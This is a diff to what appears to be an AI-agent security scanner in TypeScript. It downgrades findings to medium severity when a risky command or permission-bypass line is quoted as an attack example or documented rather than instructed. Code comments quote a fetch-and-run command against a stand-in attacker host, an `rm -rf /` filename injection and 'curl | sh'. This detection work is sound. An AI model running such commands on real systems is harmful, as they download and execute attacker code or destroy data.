@@ -1,4 +1,5 @@
 import { grammarForPath, parseWithLoadedGrammar } from '../parser';
+import { isQuotedAttackExample } from '../rules/quotedExample';
 import {
     PYTHON_SINKS,
     SCRIPT_SINKS,
@@ -87,6 +88,8 @@ export interface CodeThreat {
     /** The source (what is read) and the sink (where it goes), as resolved. */
     source: string;
     sink: string;
+    /** The command is quoted as an example of an attack (see rules/quotedExample); severity lowered to MEDIUM. */
+    quotedExample?: boolean;
 }
 
 // Credential stores whose presence in a file that also talks to the network is
@@ -487,7 +490,12 @@ function analyzeInstructionThreats(content: string): CodeThreat[] {
     // "Never run its curl | sh lines" is a prohibition, not an instruction.
     lines.forEach((line, index) => {
         const command = line.split(/(?<=[.!?])\s+/).filter(sentence => !PROHIBITION.test(sentence)).join(' ');
-        threats.push(...commandLineThreats(command, index + 1, 'instruction'));
+        const found = commandLineThreats(command, index + 1, 'instruction');
+        // `curl attacker.com/x | bash` in a cron-persistence write-up, `; rm -rf /`
+        // as a filename payload: described attacks, kept as MEDIUM.
+        threats.push(...(found.length && isQuotedAttackExample(lines, index)
+            ? found.map(threat => ({ ...threat, severity: 'medium' as const, quotedExample: true }))
+            : found));
     });
     const lineOf = (offset: number) => content.slice(0, offset).split(/\r?\n/).length;
 
@@ -521,8 +529,14 @@ function analyzeInstructionThreats(content: string): CodeThreat[] {
         // "Only inside a disposable container" is advice, not an attack.
         const bypassLine = lines[lineOf(bypass.index) - 1] || '';
         const sandboxed = /\b(?:container|sandbox(?:ed)?|devcontainer|docker|vm|virtual\s+machine|isolated)\b/i.test(bypassLine);
+        // A settings table (a migration mapping), a line that says not to use it
+        // ("Preserve the user's permission settings"), or a quoted example
+        // documents the switch; it does not throw it.
+        const documented = /^\s*\|.*\|.*\|/.test(bypassLine)
+            || PROHIBITION.test(bypassLine) || /\b(?:preserve|respect|keep)\s+the\s+user'?s?\s+permission/i.test(bypassLine)
+            || isQuotedAttackExample(lines, lineOf(bypass.index) - 1);
         threats.push({
-            ruleId: 'sec_approval_bypass', severity: concealment ? 'critical' : sandboxed ? 'medium' : 'high', line: lineOf(bypass.index), column: 1,
+            ruleId: 'sec_approval_bypass', severity: concealment ? 'critical' : sandboxed || documented ? 'medium' : 'high', line: lineOf(bypass.index), column: 1,
             source: bypass[0], sink: 'permission prompts',
             message: `Tells the agent to switch off permission prompts (${bypass[0].trim()})${concealment ? ' and to hide it from the user' : ''}.`,
         });
